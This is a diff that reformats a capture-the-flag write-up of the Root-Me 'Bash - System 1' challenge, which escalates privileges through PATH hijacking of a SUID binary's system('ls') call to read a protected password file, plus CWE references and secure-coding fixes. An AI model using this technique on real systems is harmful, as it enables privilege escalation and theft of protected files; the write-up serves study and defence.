@@ -1,37 +1,54 @@
 # Bash - System 1
 
-| | |
-|---|---|
-| **Category** | App - Script |
-| **Difficulty** | Very easy |
-| **Points** | 5 |
-| **Link** | [Root-Me](https://www.root-me.org/en/Challenges/App-Script/Bash-System-1) |
+`App - Script` • `Very Easy` • `5 pts`
 
-## Description
+## TL;DR
 
-Find your way, young padawan!
+PATH hijacking vulnerability in SUID binary. Exploit `system("ls")` by creating malicious `ls` command in `/tmp` and prepending to PATH.
 
-A C binary executes the command `ls /challenge/app-script/ch11/.passwd` using `system()`.
+**Flag:** ✓ (validated)
 
 ---
 
-## Analysis
+## Challenge Description
 
-The vulnerable code:
+> Find your way, young padawan!
 
+**Context:** A SUID C binary executes `ls /challenge/app-script/ch11/.passwd` using the insecure `system()` function.
+
+---
+
+## Recon
+
+**Binary analysis:**
+```bash
+$ file /challenge/app-script/ch11/ch11
+ch11: setuid ELF 64-bit LSB executable
+
+$ ls -la /challenge/app-script/ch11/ch11
+-rwsr-x--- 1 app-script-ch11-cracked app-script-ch11 [size] ch11
+```
+
+**Vulnerable code pattern:**
 ```c
 setreuid(geteuid(), geteuid());
 system("ls /challenge/app-script/ch11/.passwd");
 ```
 
-The `system()` function searches for the `ls` command in the **PATH** environment variable. If we create a malicious `ls` executable and prepend its location to PATH, the binary will execute our code instead of the legitimate `ls`.
+**Vulnerability identification:**
+- `system()` searches for `ls` in **PATH** environment variable
+- No absolute path (`/bin/ls`) specified
+- SUID context allows privilege escalation
 
 ---
 
-## Methodology
+## Exploitation
 
-**Step 1: Create a malicious `ls` command**
+### Attack Strategy
 
+Create malicious `ls` executable and manipulate PATH to prioritize our version.
+
+**Step 1: Create weaponized `ls`**
 ```bash
 cd /tmp
 cat > ls << 'EOF'
@@ -41,30 +58,65 @@ EOF
 chmod +x ls
 ```
 
-**Step 2: Modify the PATH**
-
+**Step 2: Hijack PATH**
 ```bash
 export PATH=/tmp:$PATH
 ```
 
-**Step 3: Execute the SUID binary**
-
+**Step 3: Trigger exploitation**
 ```bash
 /challenge/app-script/ch11/ch11
 ```
 
----
-
-## Solution
-
-The SUID binary executes our malicious `ls` script, which outputs the contents of the password file instead of listing the directory.
-
-**Flag validated:** ✓
+**Result:** Binary executes our malicious `ls`, which reads the password file with elevated privileges.
 
 ---
 
-## What I Learned
+## Impact & Mitigation
 
-- PATH hijacking: manipulating command search order
-- Insecure system() calls: always use absolute paths (`/bin/ls`) to prevent this attack
-- SUID exploitation: leveraging elevated privileges
+### Real-World Implications
+- **CWE-426**: Untrusted Search Path
+- **CWE-78**: OS Command Injection
+- **MITRE ATT&CK T1574.007**: Hijack Execution Flow via PATH Environment Variable
+
+**Attack scenarios:**
+- Privilege escalation on misconfigured systems
+- Lateral movement in enterprise environments
+- Persistence through PATH manipulation
+
+### Secure Coding Practices
+
+| Vulnerable          | Secure                   |
+|---------------------|--------------------------|
+| `system("ls file")` | `system("/bin/ls file")` |
+| Relies on PATH      | Absolute path            |
+|------------------------------------------------|
+|  Better: use `execve()` with full control      |
+
+**Code remediation:**
+```c
+// Instead of:
+system("ls /path/to/file");
+
+// Use:
+execl("/bin/ls", "ls", "/path/to/file", NULL);
+// Or validate/sanitize PATH before system() calls
+```
+
+---
+
+## Key Takeaways
+
+**Technical Skills:**
+- Exploited PATH environment variable manipulation
+- Created malicious executables for privilege escalation
+- Understood SUID binary behavior and privilege inheritance
+
+**Security Concepts:**
+- **PATH hijacking**: Critical vulnerability in command execution
+- **Principle of least privilege**: Never trust user-controlled environment variables
+- **Secure coding**: Always use absolute paths in privileged contexts
+
+**Red Team Perspective:** Common vector in CTF and real-world pentests—check SUID binaries and misconfigured scripts.
+
+**Blue Team Perspective:** Audit code for `system()` calls, enforce secure PATH in privileged contexts, use `execve()` family functions.
